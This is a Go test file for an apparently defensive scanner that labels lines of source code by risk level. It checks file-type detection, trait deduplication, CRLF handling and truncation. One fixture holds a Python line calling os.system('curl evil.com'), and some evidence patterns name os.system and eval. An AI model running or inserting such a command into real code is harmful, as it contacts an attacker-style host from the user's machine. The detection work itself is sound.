package main

import (
	"strings"
	"testing"
)

func TestIsTextFileType(t *testing.T) {
	yes := []string{"javascript", "python", "go", "rust", "package.json", "yaml", "shell", "MARKDOWN", " json "}
	no := []string{"pe", "elf", "java_class", "python-bytecode", "zip", "tar.gz", "png", "", "unknown"}
	for _, ft := range yes {
		if !isTextFileType(ft) {
			t.Errorf("isTextFileType(%q) = false, want true", ft)
		}
	}
	for _, ft := range no {
		if isTextFileType(ft) {
			t.Errorf("isTextFileType(%q) = true, want false", ft)
		}
	}
}

func TestRenderTextContentMatchesEvidence(t *testing.T) {
	body := []byte("import os\nos.system('curl evil.com')\nprint('hello')\n")
	findings := []finding{
		{ID: "objectives/exec/spawn", Crit: 5, Evidence: []string{"os.system"}},
		{ID: "metadata/import/os", Crit: 3, Evidence: []string{"import os"}},
		{ID: "noise", Crit: 1, Evidence: []string{}}, // empty evidence ignored
	}
	lines := renderTextContent(body, findings)
	if len(lines) != 4 {
		t.Fatalf("expected 4 lines, got %d", len(lines))
	}
	if lines[0].Risk != "notable" {
		t.Errorf("line 1 risk = %q, want notable (crit 3 import)", lines[0].Risk)
	}
	if lines[1].Risk != "hostile" {
		t.Errorf("line 2 risk = %q, want hostile (crit 5 os.system)", lines[1].Risk)
	}
	if lines[2].Risk != "" {
		t.Errorf("line 3 risk = %q, want empty (no match)", lines[2].Risk)
	}
	if want := []string{"metadata/import/os"}; !slicesEq(lines[0].Traits, want) {
		t.Errorf("line 1 traits = %v, want %v", lines[0].Traits, want)
	}
}

func TestRenderTextContentDedupTraits(t *testing.T) {
	body := []byte("eval(s)\n")
	findings := []finding{
		{ID: "exec/eval", Crit: 5, Evidence: []string{"eval(", "eval"}}, // both match same line
	}
	lines := renderTextContent(body, findings)
	if want := []string{"exec/eval"}; !slicesEq(lines[0].Traits, want) {
		t.Errorf("traits = %v, want single-entry %v (duplicate evidence shouldn't double-add)", lines[0].Traits, want)
	}
}

func TestRenderTextContentTrimsCRLF(t *testing.T) {
	body := []byte("first\r\nsecond\r\n")
	findings := []finding{{ID: "x", Crit: 3, Evidence: []string{"second"}}}
	lines := renderTextContent(body, findings)
	if lines[0].Text != "first" {
		t.Errorf("line 1 = %q, want %q (CR stripped)", lines[0].Text, "first")
	}
	if lines[1].Risk != "notable" {
		t.Errorf("line 2 should match evidence even with CR present in raw input; got risk %q", lines[1].Risk)
	}
}

func TestRenderTextContentTruncates(t *testing.T) {
	var b strings.Builder
	for range maxContentLines + 50 {
		b.WriteString("x\n")
	}
	lines := renderTextContent([]byte(b.String()), nil)
	if len(lines) != maxContentLines+1 { // +1 for the trailing truncation marker
		t.Fatalf("got %d lines, want %d", len(lines), maxContentLines+1)
	}
	if !strings.Contains(lines[len(lines)-1].Text, "truncated") {
		t.Errorf("last line should be the truncation marker, got %q", lines[len(lines)-1].Text)
	}
}

func slicesEq(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
